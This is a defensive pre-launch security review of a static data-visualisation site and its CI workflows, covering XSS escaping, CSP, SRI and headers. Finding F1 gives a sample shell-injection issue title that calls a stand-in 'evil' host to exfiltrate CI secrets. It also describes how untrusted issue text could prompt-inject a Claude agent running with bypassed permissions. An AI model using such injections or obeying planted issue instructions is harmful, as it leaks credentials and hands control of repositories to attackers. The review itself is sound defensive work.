# WORD-DRIFT — Pre-launch Security Review (static site)

**Scope:** Public static-site / client-side attack surface of `site/` (HTML/CSS/JS + D3 + JSON
data), plus the CI workflows under `.gitea/workflows/`. No backend, DB, auth, or server-side code
exists, so server-side classes (SQLi, SSRF, auth bypass, IDOR) are out of scope by construction.

**Review type:** Authorized defensive review of the maintainer's own project. Read-only; no source
files were modified.

**Reviewed at:** 2026-05-25. Note: `site/assets/views/loss.js` and `etl/` were being edited
concurrently by other agents; findings on `loss.js` reflect the version present at review time
(it follows the same `WD.escHtml` pattern as its sibling views).

---

## Executive summary

The client-side rendering code is, overall, **well-disciplined about XSS**. Every place that
injects data-derived strings into the DOM via `innerHTML` consistently routes the value through
`escHtml` / `WD.escHtml`, and identifier-like values (Wikidata QIDs, source URLs, filenames) are
either regex-extracted to a safe shape, drawn from a hardcoded allow-list, or slugified. The
highest-risk surface — the live **"About this event" Wikipedia/Wikidata card** — escapes the
untrusted `extract` and `url` before insertion. No hardcoded secrets are present in `site/` or the
served data; the data files are public CC-BY content.

The material risks are **not** in the rendering code. They are:

1. **The `.gitea/workflows/claude.yml` CI agent** — runs Claude with `bypassPermissions` + `Bash`
   + a write-capable `GIT_TOKEN`, fed untrusted issue/comment text. If the repo (or its issues)
   becomes public this is a **critical** prompt-injection *and* shell-injection (token-exfil) path.
2. **No Subresource Integrity / no version pin** on the D3 CDN script (supply-chain).
3. **No Content-Security-Policy** and no security response headers.
4. A handful of **defense-in-depth gaps**: `escHtml` does not escape `'`; thumbnail/href values
   built from external Wikipedia data are escaped but not scheme-validated; `target="_blank"`
   links use `rel="noopener"` without `noreferrer`.

There are no confirmed exploitable DOM-XSS sinks in the shipped site given the current data and the
escaping in place. The findings below are prioritized for hardening before public launch.

### Count by severity

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 2 |
| Medium | 4 |
| Low | 4 |

### Top 3 must-fix before going public

1. **CRITICAL — Harden / restrict `.gitea/workflows/claude.yml`.** Untrusted issue & comment text
   is interpolated both into a Bash `run:` block (shell-injection → secret exfiltration) and into
   a Claude prompt run with `--permission-mode bypassPermissions --allowedTools Bash,Write,Edit`
   and a write-scoped `GIT_TOKEN`. Restrict triggers to trusted actors, move all event text into
   `env:` (never `${{ }}` inside `run:`), and reduce token/tool scope. See F1.
2. **HIGH — Pin D3 + add SRI** (or vendor it locally). `https://cdn.jsdelivr.net/npm/d3@7/...`
   has a floating major and no `integrity`/`crossorigin`. A CDN/registry compromise or `@7`
   re-point executes arbitrary JS in every visitor's session. See F2.
3. **HIGH — Add a Content-Security-Policy + baseline security headers** at the serving layer so
   that even if a sink is missed, script/connect/img origins are constrained. See F3 and the
   ready-to-paste block below.

---

## Findings (prioritized)

| # | Sev | Location | Issue | Fix |
|---|-----|----------|-------|-----|
| F1 | **Critical** | `.gitea/workflows/claude.yml` (whole file; esp. L15-20 trigger, L37 remote-with-token, L40-42 + L76-99 untrusted text into shell+prompt, L100-105 tools/perms) | The job triggers on `issue_comment` whenever the body contains `@claude` and the commenter is not `admin` (L18-20) — i.e. **any non-admin user** on a public repo. It then (a) interpolates `github.event.issue.title` / labels directly into a `run:` shell via `${{ }}` (L40-42) — a title like `` `curl evil`$( ... ) `` executes in the runner and can exfiltrate `ANTHROPIC_API_KEY` / `GIT_TOKEN`; and (b) feeds `ISSUE_BODY`/`COMMENT_BODY` into a Claude prompt run with `--permission-mode bypassPermissions --allowedTools Bash,Read,Edit,Write` and a repo-write `GIT_TOKEN` (L99-105) — classic prompt injection: the issue author can instruct the agent to push branches, open PRs, or run arbitrary Bash. | 1) **Restrict triggers** to trusted actors: gate on `github.event.issue.user` / comment author being an org member/owner (allow-list), not just `!= 'admin'`; prefer the maintainer-only `claude` *label* path (which only repo writers can set) and drop the open `@claude`-comment trigger, or require the commenter to be a collaborator. 2) **Never put event text in `run:` via `${{ }}`** — move `ISSUE_TITLE`, `ISSUE_BODY`, `COMMENT_BODY`, `LABELS_JSON` into the step `env:` and reference them as `"$ISSUE_TITLE"` (quoted) so command substitution can't fire. 3) **Least privilege:** issue a fine-grained `GIT_TOKEN` scoped to this single repo (contents+PR only, no admin), and constrain tools — drop `Bash`/`Write` or sandbox them; keep `--max-budget-usd`/`--max-turns` (already present, good). 4) Treat `ISSUE_BODY`/`COMMENT_BODY` as data, not instructions (wrap in a clearly-delimited block and tell the model to ignore embedded directives). Until restricted, **keep issues private or the workflow disabled** when the repo is public. |
| F2 | **High** | `site/explore.html:326` `<script src="https://cdn.jsdelivr.net/npm/d3@7/dist/d3.min.js">` | No `integrity`, no `crossorigin`, floating major `@7`. CDN/registry compromise or a malicious `@7` republish runs arbitrary JS with full page privileges for every visitor. | Pin an exact version and add SRI, e.g. `<script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js" integrity="sha384-…" crossorigin="anonymous" referrerpolicy="no-referrer"></script>` (generate the hash with `curl -s <url> \| openssl dgst -sha384 -binary \| openssl base64 -A`). **Preferred:** vendor D3 locally under `site/assets/vendor/d3-7.9.0.min.js` and load from `'self'` — removes the third-party origin entirely and simplifies the CSP. |
| F3 | **High** | Serving layer (all of `site/`); no CSP anywhere | No Content-Security-Policy and no security response headers. A single missed sink, a malicious dependency, or injected markup would have unrestricted script/connect/img capability. | Add the CSP + headers block below at the web-server/CDN layer (preferred) or via `<meta http-equiv>` for CSP. Because the site relies on a **large inline `<script>` in `explore.html` plus small pre-paint theme `<script>` blocks** in all three pages, a clean `script-src 'self'` is not achievable without either (a) moving inline scripts to external files (best), or (b) hashing each inline block (`'sha256-…'`), or (c) accepting `'unsafe-inline'` for `script-src` as an interim. See the discussion under the CSP block. |
| F4 | Medium | `site/explore.html:1302-1304` `escHtml` | `escHtml` escapes `& < > "` but **not** `'` (single quote). Safe today because every audited sink that uses external/untrusted data inserts it into **double-quoted** attributes or text nodes. It is a latent footgun: any future single-quoted attribute built with `escHtml(...)` would be breakout-able. | Add `.replace(/'/g,"&#39;")` (and optionally `` ` `` → `&#96;`) to `escHtml`. Cheap, removes the footgun. |
| F5 | Medium | `site/explore.html:2518-2521` (thumbnail `src`) and `:2531` (`href=escHtml(info.url)`) | The Wikipedia thumbnail URL and article URL come from **untrusted external API responses**. They are HTML-escaped (can't break out of the attribute) but **not scheme-validated**. A non-`https` thumbnail would cause mixed-content; a `javascript:`/`data:` value in `info.url` would execute on click (escaping does not neutralise the URL scheme, only the quotes). In practice Wikimedia returns https URLs, but the response is attacker-influenceable in principle and must be validated. | Validate the scheme before use: accept the thumbnail only if it matches `^https://[a-z0-9.-]*\.wikimedia\.org/` (or at minimum `^https://`); accept `info.url` only if it starts with `https://` and host ends in `.wikipedia.org`. Reject/omit otherwise. The CSP `img-src` / `connect-src` allow-list (below) is the second layer. |
| F6 | Medium | `site/explore.html:8-10`, `about.html:8-10`, `downloads.html:8-10` (Google Fonts) | Fonts load from `fonts.googleapis.com` / `fonts.gstatic.com`. This leaks visitor IP + per-pageview requests to Google (privacy / GDPR consideration for an EU-hosted academic site) and adds two third-party origins to the trust base. | Either self-host the two font families under `site/assets/fonts/` (eliminates the third-party origins and the CSP `font-src`/`style-src` exceptions) or keep the CDN and document it in the privacy note. Self-hosting is the cleaner, GDPR-friendlier option. |
| F7 | Medium | `.gitea/workflows/claude.yml:125` `git push origin "${BRANCH}" --force` | Force-push inside the CI agent path. Combined with F1 it lets an injected run rewrite branch history. Lower severity once F1 is fixed, but the `--force` on an attacker-influenced `BRANCH` (`claude/issue-N`) is unnecessary risk. | Drop `--force` (the branch is freshly created at L73, so a normal push suffices); never force-push from automation. |
| F8 | Low | `site/explore.html:32`,`280`; `about.html`,`downloads.html` (all `target="_blank"`) | `target="_blank"` anchors use `rel="noopener"` (good against reverse tabnabbing) but not `rel="noreferrer"`. Modern browsers imply `noopener` anyway, so this is hardening only; referrer is still sent to external sites. | Use `rel="noopener noreferrer"` on outbound `target="_blank"` links if referrer-stripping is desired (low priority; consistent with the project's stated anti-tracking preferences). |
| F9 | Low | `site/explore.html:574` `expTooltip.innerHTML = html` (and the view tooltips in `map.js:250`, `trends.js:222`, `network.js`) | Tooltip HTML is assembled by callers; all audited callers escape data with `escHtml`/`esc`, so it is safe today. It is a shared sink that depends on every caller remembering to escape — a maintainability risk. | Keep callers escaping; optionally document the contract ("`showTip` expects pre-escaped HTML") at the function. No code change strictly required. |
| F10 | Low | `site/graph.json` (1.9 MB) shipped alongside `graph-core.json` + `graph-detail.json` | The app loads `graph-core.json`/`graph-detail.json`; `graph.json` appears to be the legacy full model (referenced only by a comment in `exporter.js:315`). Shipping it bloats the deploy and widens the exposed surface unnecessarily (no sensitive content, but dead weight). | Confirm `graph.json` is unused by the runtime and drop it from `site/` (keep it in `viz/data/` if the exporter needs it), or document why it ships. No security impact beyond surface reduction. |
| — | Info | `site/`, `site/downloads/` data scan | Grep for keys/tokens/PEM/AWS/`sk-ant`/`ghp_` across `site/` returned **no secrets** — all "secret"/"leak" hits are lexical-data glosses (e.g. *leaken*, *konspirative Wohnung*, WikiLeaks trigger). The served `.csv`/`.ttl`/`.nt`/`.jsonld`/`.json` are public CC-BY dataset content. Safe to expose. | None. |

---

## Recommended CSP + security headers (ready to paste)

These assume the recommended hardening: **D3 vendored locally** (F2) and **fonts self-hosted**
(F6). If you keep the CDNs, add the commented origins back in (shown inline).

### Web-server / CDN response headers (preferred — applies to every response)

```
# --- Content Security Policy ---
# connect-src MUST include the Wikimedia origins used by wikiInfo():
#   www.wikidata.org (wbgetentities) and *.wikipedia.org (REST summary).
# img-src MUST include upload.wikimedia.org for thumbnails.
Content-Security-Policy:
  default-src 'self';
  base-uri 'self';
  object-src 'none';
  frame-ancestors 'none';
  form-action 'self';
  script-src 'self';
  # If inline <script> blocks are NOT externalised, replace the line above with one of:
  #   script-src 'self' 'unsafe-inline';                      (interim, weakest)
  #   script-src 'self' 'sha256-<hash-of-each-inline-block>'; (preferred if kept inline)
  # If D3 stays on the CDN instead of vendored, add:  https://cdn.jsdelivr.net
  style-src 'self' 'unsafe-inline';
  # ('unsafe-inline' for styles is needed for the inline style="..." attributes on
  #  legend swatches / confidence bars / chart chrome. If fonts stay on Google, also add:
  #   style-src 'self' 'unsafe-inline' https://fonts.googleapis.com)
  img-src 'self' data: https://upload.wikimedia.org https://*.wikimedia.org;
  font-src 'self';
  # (if fonts stay on Google, add:  font-src 'self' https://fonts.gstatic.com)
  connect-src 'self' https://www.wikidata.org https://*.wikipedia.org;
  manifest-src 'self';
  worker-src 'self';
  upgrade-insecure-requests

# --- Other security headers ---
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: DENY
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()
Strict-Transport-Security: max-age=63072000; includeSubDomains   # HTTPS only — omit on plain-HTTP dev
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

### `<meta>` fallback for CSP (if you cannot set response headers)

Place in each page `<head>` (note: `frame-ancestors`, `X-Frame-Options`, and HSTS **cannot** be
set via meta — they must be real headers; the rest work as meta):

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https://upload.wikimedia.org; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://www.wikidata.org https://*.wikipedia.org; upgrade-insecure-requests">
```

### Honest note on inline scripts and `'unsafe-inline'`

`explore.html` contains a **large inline `<script>`** (the whole app) plus a **small pre-paint
theme `<script>`**; `index.html`/`about.html`/`downloads.html` each have small pre-paint theme
scripts. To get a strict `script-src 'self'` (no `'unsafe-inline'`):

- **Best:** move every inline script into external `.js` files (e.g. `assets/explore-app.js`,
  `assets/theme.js`) and reference them with `<script src=…>`. Then `script-src 'self'` works
  cleanly and gives real XSS containment.
- **Good:** keep inline but add a `'sha256-…'` hash per inline block to `script-src` (recompute on
  every edit — brittle but strict).
- **Interim:** `script-src 'self' 'unsafe-inline'` — easy, but `'unsafe-inline'` defeats most of
  CSP's XSS value. Acceptable only as a stopgap. Note `style-src 'unsafe-inline'` is harder to
  remove because the code sets many `style="..."` attributes; it is far lower risk than script.

---

## Deploy hardening checklist

- [ ] **HTTPS only.** Redirect HTTP→HTTPS; enable HSTS (`Strict-Transport-Security`) once HTTPS is stable.
- [ ] **Pin + SRI (or vendor) D3** (F2). Verify the hash; prefer local vendoring.
- [ ] **Self-host fonts** (F6) or document the Google Fonts privacy implication.
- [ ] **Set CSP + the security headers** above at the server/CDN layer; verify with
      `curl -sI https://<host>/explore.html` and browser devtools (no CSP violations in console).
- [ ] **Disable directory listing** (`autoindex off` in nginx / `Options -Indexes` in Apache /
      no fancy-index on the static host). The dev `python -m http.server` *does* list directories —
      do not use it in production.
- [ ] **Correct MIME types + `X-Content-Type-Options: nosniff`** — ensure `.json`→`application/json`,
      `.ttl`→`text/turtle`, `.jsonld`→`application/ld+json`, `.nt`→`application/n-triples`,
      `.csv`→`text/csv`, `.js`→`text/javascript`. Misserved types + nosniff can break downloads if
      the server's MIME map is incomplete — verify after deploy.
- [ ] **Confirm only intended files are exposed** under the web root: ship only `site/**`. Do NOT
      deploy `.git/`, `.gitea/`, `etl/`, `scripts/`, `data/`, `paper/`, or repo dotfiles to the
      public root. (The Gitea/GitHub Pages flow in `site/DEPLOY.md` flattens `site/*` — verify the
      `pages` branch contains *only* site assets.)
- [ ] **Drop the redundant `site/graph.json`** if unused by the runtime (F10).
- [ ] **`escHtml` hardening** — add `'` escaping (F4) before launch.
- [ ] **Scheme-validate external URLs** from `wikiInfo` (F5).
- [ ] **CI lockdown** — apply F1/F7 before the repo or its issues become public; verify the
      `claude.yml` trigger cannot be fired by an untrusted actor and that event text is no longer
      interpolated into `run:`.
- [ ] **Re-run a secrets scan** on the final `pages`/published tree (gitleaks or
      `grep -rniE 'api[_-]?key|secret|token|-----BEGIN|sk-ant|ghp_'`) — confirmed clean at review time.

---

## Methodology / coverage

- Audited every `innerHTML` / `insertAdjacentHTML` sink in `site/explore.html` (inline app script)
  and in `site/assets/views/{map,network,trends,compare,exporter}.js` (+ `loss.js` at its
  current state). Each data-bearing sink routes through `escHtml`/`WD.escHtml`; identifier values
  are regex-extracted (`Q\d+`), drawn from hardcoded allow-lists (`SOURCE_URL`), or slugified
  (`exporter.js` `slug()`), and numeric values are `Math.round`/`toFixed`. No unescaped
  data-into-DOM path was found.
- Traced the live external-content path end-to-end: `wikiInfo()` (`explore.html:2184`) →
  `renderTriggerWikiCard()` (`:2469`). `extract`, `url`, paragraphs are `escHtml`-escaped;
  thumbnail/url are escaped but not scheme-validated (F5).
- Verified deep-link params (`?word`, `?trigger`, `?lang`, `#triggers`) are used only for
  data lookup and never reflected into the DOM; URL writes use `URLSearchParams` (`:1311`).
- Verified the exporter's Blob/`createObjectURL` download path and slugified filenames
  (`exporter.js:110-121, 371-374`); SVG→PNG raster loads SVG via `img.src` (non-scripting context).
- Reviewed both CI workflows; `test.yml` is benign (no secrets, runs tests). `claude.yml` is F1/F7.
- Secret scan across `site/` and `site/downloads/`: none found (data is public CC-BY).
